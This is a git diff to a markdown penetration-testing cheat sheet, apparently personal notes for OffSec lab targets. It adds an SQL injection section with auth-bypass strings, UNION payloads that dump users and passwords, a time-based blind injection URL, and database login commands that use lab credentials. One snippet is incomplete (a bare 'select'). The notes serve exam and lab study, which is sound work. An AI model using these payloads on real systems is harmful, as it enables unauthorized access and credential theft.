@@ -641,12 +641,12 @@ Inspect:
 - [Default admin consoles & logins](8.0.1%20-%20Admin%20Consoles.md)
 
 ### [nmap](Tools.md#nmap)
-##### Grab web server's banner:
+##### Grab web server's banner
 ```bash
 sudo nmap -sV -p 80 <ip>
 ```
 
-##### Perform initial fingerprint of web app:
+##### Perform initial fingerprint of web app
 ```bash
 sudo nmap -p 80 --script=http-enum <ip>
 ```
@@ -769,6 +769,124 @@ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/
 ## XSS
 
 
+
+## SQLi
+
+##### MySQL login
+```bash
+# for Linux/ Mac(?)-based MySQL servers
+mysql -u root -p 'root' -h 192.168.50.16 -P 3306
+
+# for Windows-based MSSQL servers
+impacket-mssqlclient Administrator:LAB123@192.168.50.18 -windows-auth
+```
+
+##### Retrieve SQL version
+```sql
+-- MySQL
+select version();
+
+-- Test.  Might only work for Windows-based MSSQL servers
+SELECT @@version;
+```
+
+##### Retrieve current username & hostname for the connection
+```sql
+-- MySQL
+select system_user();
+```
+
+##### Retrieve list of all databases running in the session
+```sql
+-- MySQL
+show databases;
+
+--MSSQL
+SELECT name FROM sys.databases;
+```
+
+##### Retrieve *offsec user* and *authentication_string* value belonging to the *user* table
+```sql
+SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
+```
+
+##### Retrieve tables of a specific database
+```sql
+-- MySQL
+select
+
+-- MSSQL
+SELECT * FROM <db>.information_schema.tables;
+```
+
+##### Retrieve table data
+```sql
+-- MySQL
+show tables from <db>;
+
+-- MSSQL
+select * from <db>.dbo.<table_name>;
+```
+
+##### Search for tables within all databases
+```sql
+SELECT table_schema as database_name, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE' AND table_schema not in ('information_schema','mysql','performance_schema','sys') ORDER BY database_name, table_name;
+```
+
+##### Test Auth Bypass
+```sql
+-- In form field
+-- Prepend '
+OR 1=1-- //
+
+-- Test further
+-- Prepend '
+OR 1=1 in (select @@version)-- //
+```
+
+##### Retrieve users
+```sql
+-- All users
+-- Prepend '
+OR 1=1 in (select * from users)-- //
+
+-- Specific user
+-- Prepend '
+OR 1=1 in (select password from users where username = 'admin')-- //
+```
+
+##### Determine number of db's column
+```sql
+-- Increase number up until error message is achieved.  Latest successful number is the # of columns
+-- Prepend '
+order by 1-- //
+```
+
+##### Enumerate current db, user, & MySQL version
+```sql
+-- Using % for wildcard
+-- Prepend '
+-- First column should be null as it doesn't return string values (reserved for ID field consisting of an integer data type)
+%' UNION SELECT null, database(), user(), @@version, null-- //
+```
+
+#####  Retrieve columns table from *information_schema* db
+```sql
+-- Prepend '
+UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database()-- //
+```
+
+#####  Dump *users* table
+```sql
+-- Prepend '
+UNION SELECT null, username, password, description, null FROM users-- //
+```
+
+#####  Time-based SQLi payload
+```sql
+-- In url.  Requires PHP $_GET variable and parameters passed in URL
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3), 'false')-- //
+```
 
 
 
